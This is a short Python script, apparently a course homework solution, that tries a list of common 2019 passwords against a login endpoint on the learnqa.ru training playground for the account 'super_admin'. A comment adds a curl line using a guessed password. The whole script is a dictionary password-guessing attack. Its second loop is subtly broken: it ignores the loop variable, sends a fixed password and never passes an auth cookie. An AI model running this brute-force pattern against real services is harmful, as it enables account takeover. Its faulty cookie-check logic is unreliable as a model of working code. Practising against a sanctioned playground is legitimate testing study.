import requests

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
auth_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

list_of_passwords_2019 = {"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"}

for password_2019 in list_of_passwords_2019:
    request = requests.post(url, data={"login":"super_admin","password":password_2019})
    print(request.text)


for password_2019 in list_of_passwords_2019:
    request = requests.post(auth_url, data={"password":"welcome","equals":True})
    print(request.text)

#curl для проверки:
#curl -X POST "https://playground.learnqa.ru/ajax/api/get_secret_password_homework" -d "login=super_admin&password=welcome"

